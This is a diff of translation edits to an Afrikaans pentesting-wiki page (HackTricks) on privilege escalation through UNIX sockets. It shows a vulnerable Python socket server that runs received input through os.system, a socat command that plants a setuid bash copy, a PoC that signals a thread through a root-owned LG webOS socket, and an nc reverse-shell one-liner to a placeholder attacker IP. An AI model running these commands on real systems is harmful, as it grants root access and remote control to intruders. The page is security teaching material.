@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Socket binding-voorbeeld met Python
+## Socket binding example with Python
 
-In die volgende voorbeeld word 'n **unix socket geskep** (`/tmp/socket_test.s`) en alles wat **ontvang** word, sal deur `os.system` **uitgevoer** word. Ek weet dat jy dit nie in die wild gaan vind nie, maar die doel van hierdie voorbeeld is om te sien hoe kode wat unix sockets gebruik lyk en hoe om die invoer in die slegste moontlike geval te hanteer.
+In die volgende voorbeeld word 'n **unix socket geskep** (`/tmp/socket_test.s`) en alles wat **ontvang** word, gaan deur `os.system` **uitgevoer** word. Ek weet dat jy dit nie in die natuur gaan vind nie, maar die doel van hierdie voorbeeld is om te sien hoe code wat unix sockets gebruik lyk, en hoe om die input in die slegste moontlike geval te hanteer.
 ```python:s.py
 import socket
 import os, os.path
@@ -37,17 +37,17 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## Gevalstudie: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+## Gevalstudie: Root-owned UNIX socket sein-geaktiveerde eskalasie (LG webOS)
 
-Sommige privileged daemons openbaar 'n root-owned UNIX socket wat untrusted input aanvaar en privileged actions koppel aan thread-IDs en signals. As die protocol 'n unprivileged client toelaat om te beïnvloed watter native thread geteikend word, kan jy moontlik 'n privileged code path trigger en escalate.
+Sommige bevoorregte daemons maak 'n root-owned UNIX socket beskikbaar wat onbetroubare insette aanvaar en bevoorregte aksies koppel aan thread-IDs en seine. As die protokol 'n onbevoorregde kliënt toelaat om te beïnvloed watter native thread geteiken word, kan jy moontlik 'n bevoorregte kodepad triggreer en eskaleer.
 
 Waargenome patroon:
-- Verbind met 'n root-owned socket (bv., /tmp/remotelogger).
-- Skep 'n thread en bekom sy native thread id (TID).
-- Stuur die TID (packed) plus padding as 'n request; ontvang 'n acknowledgement.
-- Lewer 'n spesifieke signal aan daardie TID om die privileged behaviour te trigger.
+- Connect to a root-owned socket (e.g., /tmp/remotelogger).
+- Create a thread and obtain its native thread id (TID).
+- Send the TID (packed) plus padding as a request; receive an acknowledgement.
+- Deliver a specific signal to that TID to trigger the privileged behaviour.
 
-Minimal PoC sketch:
+Minimale PoC-skets:
 ```python
 import socket, struct, os, threading, time
 # Spawn a thread so we have a TID we can signal
@@ -59,14 +59,14 @@ s.sendall(struct.pack('<L', tid) + b'A'*0x80)
 s.recv(4)  # sync
 os.kill(tid, 4)  # deliver SIGILL (example from the case)
 ```
-Om dit in 'n root shell te omskep, kan 'n eenvoudige named-pipe + nc patroon gebruik word:
+Om dit in 'n root shell te omskep, kan 'n eenvoudige named-pipe + nc-patroon gebruik word:
 ```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
 Aantekeninge:
-- Hierdie klas foute ontstaan deur vertroue te stel in waardes wat afgelei is van onprivilegieerde kliënttoestand (TIDs) en dit te bind aan bevoorregte signal handlers of logika.
-- Maak veiliger deur credentials op die socket af te dwing, boodskapformate te valideer, en bevoorregte operasies te ontkoppel van eksterne aangeleverde thread identifiers.
+- Hierdie klas foute ontstaan deur waardes, afgelei van nie-geprivilegieerde kliënttoestand (TIDs), te vertrou en dit te bind aan geprivilegieerde signal handlers of logika.
+- Verhard deur credentials op die socket af te dwing, message formats te valideer, en privileged operations te ontkoppel van externally supplied thread identifiers.
 
 ## Verwysings
 
